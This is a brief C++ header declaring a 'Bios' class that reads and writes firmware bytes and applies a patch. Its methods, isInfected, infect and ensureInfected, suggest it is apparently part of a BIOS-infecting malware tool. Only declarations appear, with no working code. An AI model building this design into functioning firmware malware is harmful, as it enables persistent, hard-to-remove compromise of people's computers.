#ifndef BIOS_HPP_
#define BIOS_HPP_

#include "BiosVector.hpp"
#include "IBiosIO.hpp"
#include "Patch.hpp"
#include "logs/Log.hpp"
#include <vector>
#include <mutex>

class Bios {
private:
	Log * pLog;
    IBiosIO * pBiosIO;
    IPatch * pPatch;

    BiosVector biosBytesVector;
    std::mutex lock;
public:
    Bios(Log * pLog);

    void setBiosIO(IBiosIO * pBiosIO);
    void setPatch(IPatch * pPatch);

	void read();
    bool isReaded();
	void write();
	bool isInfected();
	void infect();
    void ensureInfected();
    void clear();
};

#endif /* BIOS_HPP_ */
